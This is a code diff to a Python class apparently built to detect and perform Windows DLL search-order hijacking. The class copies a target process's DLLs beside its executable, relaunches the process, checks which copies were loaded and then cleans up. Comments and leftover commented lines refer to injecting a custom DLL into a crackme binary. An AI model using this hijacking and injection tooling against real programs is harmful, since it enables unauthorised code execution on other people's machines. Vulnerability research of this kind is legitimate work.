@@ -1,4 +1,4 @@
-import os
+import os, signal
 from tqdm import tqdm
 from pyinjector import inject
 import subprocess
@@ -104,16 +104,23 @@ class hiJacking():
         program_name, list_dlls = self.list_dll(pid)
         program_path = os.path.dirname(program_name)
         changed_path = []
+        search_order_path = []
         for i in list_dlls:
             name_split = i.split('/')
             name = name_split[-1]
-            search_order_path = program_path + "/" + name
-            try:
-                shutil.copy2(list_dlls,search_order_path)
-                changed_path.append(search_order_path)
-            except:
-                print(i + "  1순위 복사 에러")
+            search_order_path.append(program_path + "/" + name)
             
+        for i in range(len(list_dlls)):
+            try:
+                shutil.copy2(list_dlls[i],search_order_path[i])
+                changed_path.append(search_order_path[i])
+            except:
+                print(list_dlls[i] + "  1순위 복사 에러")
+            print(search_order_path[i])
+            
+            print(list_dlls[i])
+            print("-------------------------")
+        print(program_name)
         newPid = self.create_process(program_name)
         program_name, newList_dlls = self.list_dll(newPid)
         
@@ -132,8 +139,15 @@ class hiJacking():
                     j.endswith(name)
                     successed_path2[i] = j
         
-        
-        return successed_path
+        try:
+            for i in changed_path:
+                psutil.Process(newPid).kill()
+                #psutil.Process(pid).kill()
+                print(i)
+                os.remove(i)
+        except:
+            print("cannot remove file")
+        return successed_path2
         
     # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
     # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
@@ -189,11 +203,7 @@ if __name__=='__main__':
     path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
     #pid = dll_hijact.create_process(path_exe)
     #inject(pid,path_dll)
-    program_name, list_dlls = dll_hijact.list_dll(32980)
-    print(program_name)
-    
-    for i in list_dlls:
-        print(i)
-    
-    
-        
+    #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
+    success = dll_hijact.search_order_hijack(15264)    
+    for i,j in success.items():
+        print(i,j)
